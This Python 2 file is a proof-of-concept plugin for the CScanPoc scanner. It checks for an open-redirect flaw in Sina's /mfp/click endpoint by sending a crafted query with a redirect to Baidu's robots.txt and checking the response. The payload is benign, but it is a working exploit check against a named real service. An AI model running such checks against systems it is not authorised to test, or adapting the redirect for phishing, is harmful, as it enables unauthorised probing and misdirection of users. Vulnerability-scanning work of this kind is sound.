# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Sina_0104'  # 平台漏洞编号
    name = '新浪url跳转'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-10-12'  # 漏洞公布时间
    desc = '''
    新浪url跳转漏洞，攻击者可以通过url跳转将应用程序引导到不安全的第三方区域，从而导致的安全问题。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=74172
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '新浪'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '673cd893-80c1-42d1-bd90-51f019f7ec58'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            targeturl = "https://www.baidu.com/robots.txt"
            payload = "/mfp/click?type=3&t=MjAxNC0wOC0yOCAxMDo0MzozNAkyMjIuNDEuMTcwLjY2CV9fMjIyLjQxLjE3MC42Nl8xNDA5MTkzMzE4XzAuMTg5OTQxMDAJaHR0cDovL25ld3Muc2luYS5jbj9zYT10MTI0ZDEyNjY0NTA3djcxJmRvbWFpbj13d3cuYmFpZHUuY29tJndtPTQwMDcmdnQ9NAlQRFBTMDAwMDAwMDIxMDcyCTg0MDYwYzk1LTc2MjItNDc0My04YzNlLTQwZjkzYWEzOGY3Zgk4RjhFNjM2MkYxQkEJOEY4RTYzNjJGMUJBCS0JLQkzMjMwMDB8MzIzMDAxCThGOEU2MzYyRjFCQQlOQjEzMTAwMTI3CQk4RjhFNjM2MkYxQkEJV0FQCS0JNTMJLQktCS0JLQktCS0JLQktCTQ%3D&url={}".format(
                targeturl)
            url = self.target + payload
            response = requests.get(url)
            if response.status_code == 200 and "User-agent: Baiduspider" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
